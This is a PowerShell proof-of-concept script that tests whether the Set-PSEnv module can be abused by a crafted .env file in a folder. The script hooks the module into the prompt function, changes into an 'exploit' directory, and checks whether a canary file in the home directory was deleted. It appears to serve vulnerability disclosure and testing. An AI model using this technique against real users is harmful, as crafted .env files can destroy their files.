

$isinstalled = (Get-Module -ListAvailable | ? { $_.Name -eq "Set-PSEnv" } | Measure).Count -gt 0

if (-not $isinstalled) {
    Install-Module "Set-PSEnv" -force -allowclobber -Verbose
}
# these commands need to be run interactively to see the xpoit in action
$verbosepreference = "Continue"

"This is a canary file" | Out-File ~/setpsenvcanaryfile.txt -verbose

# Do the exploit, using the .Env file in this folder

Ipmo Set-PsEnv -verbose

# trigger Set-PSenv on changing dir
function prompt {
    # drop it in the prompt function as recommended in the module's readme
    Set-PsEnv -verbose
}

#trigger it
cd $repos/exploit

# are we vulnerable
$isvulnerable = (Test-Path ~/setpsenvcanaryfile.txt) -eq $false
Write-Host "Vulnerable status: $isvulnerable"

$verbosepreference = $silentlycontinue

Uninstall-Module "Set-PSEnv" -force